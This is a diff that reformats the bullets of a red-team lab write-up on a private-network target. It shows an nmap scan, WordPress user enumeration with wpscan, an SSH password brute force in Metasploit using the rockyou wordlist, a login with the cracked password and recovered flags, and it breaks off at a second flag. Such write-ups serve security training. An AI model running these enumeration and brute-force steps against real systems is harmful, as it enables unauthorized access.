@@ -15,54 +15,54 @@ $ nmap -sV 192.168.1.110
 This scan identifies the services below as potential points of entry:
 
 * Target 1
-o Port 22/TCP SSH
-o Port 80/TCP http
-o Port 111/TCP rpcblind
-o Port 139/TCP netbios -ssn
-o Port 445/TCP netbios -ssn
+	- Port 22/TCP SSH
+	- Port 80/TCP http
+	- Port 111/TCP rpcblind
+	- Port 139/TCP netbios -ssn
+	- Port 445/TCP netbios -ssn
 
 The following vulnerabilities were identified on each target:
 
 * Target 1
-o Wordpress enumeration
-o Improper use of SSH
-o Weak user password
-o Misconfigure use of privilege escalation
+	- Wordpress enumeration
+	- Improper use of SSH
+	- Weak user password
+	- Misconfigure use of privilege escalation
 
 Exploitation
 
 The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
 
 * Target 1
-o flag1.txt: b9bbcb33e11b80be759c4e844862482d
-* Exploit Used
-* Used wpscan to enumerate the user from the wordpress website
-* wpscan –url http://192.168.1.110/wordpress -enumerate u
+	- flag1.txt: b9bbcb33e11b80be759c4e844862482d
+		- Exploit Used
+			- Used wpscan to enumerate the user from the      wordpress website
+			- wpscan –url http://192.168.1.110/wordpress -enumerate u
 
 
-* Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
-* Msfconsole
-* Use auxiliary/scanner/ssh/ssh_login
-* options
-* set Rhosts 192.168.1.110, 
-* set PASS_File /usr/share/wordlists/rockyou.txt,
-*  set USERNAME Michael
-* Set VERBOSE true
-* run
+			- Used SSH scanner module on Metasploit to brute force login attempts with the username and Michael and wordlists from Kali
+			- Msfconsole
+			- Use auxiliary/scanner/ssh/ssh_login
+			- options
+			- set Rhosts 192.168.1.110, 
+			- set PASS_File /usr/share/wordlists/rockyou.txt,
+			- set USERNAME Michael
+			- set VERBOSE true
+			- run
 
 
 
 
-* I then login into Michael via SSH 
-* SSH michael@192.168.1.110 password: michael
+			- I then login into Michael via SSH 
+			- SSH michael@192.168.1.110 password: michael
 
-* I then went into the html directory and listed the directories in it
-* cd /var/www/html
-* ls
+			- I then went into the html directory and listed the directories in it
+			- cd /var/www/html
+			- ls
 
-* I then went into the service.html file and found flag1.
-* nano service.html
-*  ctrl+w “flag”
+			- I then went into the service.html file and found flag1.
+			- nano service.html
+			-  ctrl+w “flag”
 
 o flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c
 * Exploit Used
